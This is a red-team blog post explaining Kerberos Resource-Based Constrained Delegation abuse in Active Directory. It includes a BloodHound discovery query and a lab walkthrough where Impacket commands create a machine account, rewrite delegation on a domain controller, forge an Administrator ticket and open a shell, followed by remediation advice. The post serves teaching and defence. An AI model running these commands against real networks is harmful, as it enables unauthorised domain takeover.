---
layout: post
title: "From GenericWrite to Domain Admin: Mastering Resource-Based Constrained Delegation (RBCD)"
date: 2025-08-04 14:00:00 +0000
categories: [active-directory, rbcd, privilege-escalation]
tags: [red-team, kerberos, delegation, s4u, bloodhound]
description: "A deep dive into exploiting Kerberos S4U extensions to escalate from a standard user to Domain Admin, and how to defend against it."
image: /assets/img/rbcd-banner.jpg  # Optional: Add a banner image if your theme supports it
---

# Active Directory 101: Resource-Based Constrained Delegation (RBCD)

**Complexity:** High | **Impact:** Critical | **Prevalence:** Common

---

## 🚀 The Elevator Pitch
Resource-Based Constrained Delegation (RBCD) is one of the most elegant privilege escalation paths in Active Directory. Unlike traditional constrained delegation (which requires Domain Admin privileges to configure), RBCD can be configured by **anyone** with write permissions on a computer object.

For a Red Teamer, this means if you find a `GenericWrite` or `WriteProperty` on a target computer, you can trick Active Directory into letting you impersonate **Administrator** on that machine.



---

## 🧠 The Concept: How S4U Works
To understand the exploit, we must understand the feature. RBCD relies on the **Kerberos Service-for-User (S4U)** extensions, specifically designed to allow services to request tickets on behalf of users.

<div class="key-concept" markdown="1">
**The "AllowedToAct" Attribute**

Unlike classic delegation (configured on the *front-end* service), RBCD is configured on the *target* resource using the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute. 

It effectively says: *"I trust <u>Computer A</u> to authenticate users on my behalf."*
</div>

The magic happens in two steps:
1.  **S4U2Self:** The attacker's controlled computer asks the KDC: *"I need a ticket for Administrator to access myself."* The KDC obliges.
2.  **S4U2Proxy:** The attacker's computer presents that ticket and asks: *"Administrator is trying to access the Target Resource through me. Can I get a ticket for them?"*
3.  **Result:** The KDC issues a valid Service Ticket for Administrator to the Target.



---

## 🔍 The Discovery: BloodHound
The hardest part of this attack isn't the execution; it's the discovery. We are looking for a specific Access Control Entry (ACE).

**What to look for:**
* **Edge:** `GenericAll`, `GenericWrite`, `WriteProperty`, or `WriteOwner`.
* **Target:** A Computer Object (The victim server).
* **Source:** Any user you have compromised.

<div class="bloodhound-note" markdown="1">
**BloodHound Query:**
`MATCH p=(u:User)-[r:GenericWrite|GenericAll|WriteDacl|WriteOwner]->(c:Computer) RETURN p`
</div>



---

## ⚔️ The Kill Chain (Lab Demo)

Let's walk through a live exploitation on a **GOAD (Game of Active Directory)** lab environment.

**The Scenario:**
* **Compromised User:** `stannis.baratheon`
* **Target Server:** `KINGSLANDING$` (Domain Controller)
* **Vulnerability:** Stannis has `GenericWrite` on the `KINGSLANDING` object.

### Step 1: Establish a Foothold (The Fake Service)
We need a service account to perform S4U operations. Since we don't have one, we will create one. By default, any authenticated user can join up to 10 machines to the domain (`MachineAccountQuota`).

```bash
# Create a controlled machine account "EVILCOMPUTER"
proxychains addcomputer.py sevenkingdoms.local/stannis.baratheon:Drag0nst0ne \
    -method LDAPS \
    -computer-name EVILCOMPUTER$ \
    -computer-pass EvilPass123!

# Result: EVILCOMPUTER$ created successfully

```

### Step 2: Weaponize the Delegation

Now we use our write primitive. We will modify the target's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute to trust our new computer.

```bash
# Configure KINGSLANDING to trust EVILCOMPUTER
proxychains rbcd.py sevenkingdoms.local/stannis.baratheon:Drag0nst0ne \
    -delegate-from EVILCOMPUTER$ \
    -delegate-to KINGSLANDING$ \
    -action write

```

### Step 3: The Protocol Abuse (S4U)

We request the ticket. We ask the KDC to let us impersonate `Administrator` from our evil computer to the target.

```bash
# Execute S4U2Self + S4U2Proxy
proxychains getST.py sevenkingdoms.local/EVILCOMPUTER$:EvilPass123! \
    -spn cifs/kingslanding.sevenkingdoms.local \
    -impersonate Administrator \
    -dc-ip kingslanding.sevenkingdoms.local

# Output: Administrator.ccache saved

```

### Step 4: Execution

With the ticket in hand, we access the target.

```bash
export KRB5CCNAME=Administrator.ccache

# Pop a shell as SYSTEM
proxychains wmiexec.py sevenkingdoms.local/Administrator@kingslanding.sevenkingdoms.local \
    -k -no-pass

```

<div class="success-box" markdown="1">
**Pwned!** You have moved laterally from a standard user to Domain Admin on the DC.
</div>

---

## 🛡️ Remediation & Defense

As consultants, our job isn't just to break it, but to fix it. Here is how organizations can stop RBCD:

1. **Set MachineAccountQuota to 0:** Prevent users from creating the dummy computers needed for the attack.
2. **Audit DACLs:** Regularly scan for dangerous permissions (Write/GenericAll) on Computer objects using tools like BloodHound or PingCastle.
3. **Tiered Administration:** Ensure standard users never have permissions over Tier 0 (Domain Controller) assets.

---

## 🧰 Toolkit

* **Discovery:** [BloodHound](https://github.com/SpecterOps/BloodHound)
* **Exploitation:** [Impacket (rbcd.py, getST.py)](https://github.com/fortra/impacket)
* **Alternative:** [Rubeus (C#)](https://github.com/GhostPack/Rubeus)

---

*Disclaimer: This post is for educational purposes and cybersecurity research only. Always obtain written permission before testing on any network.*

```
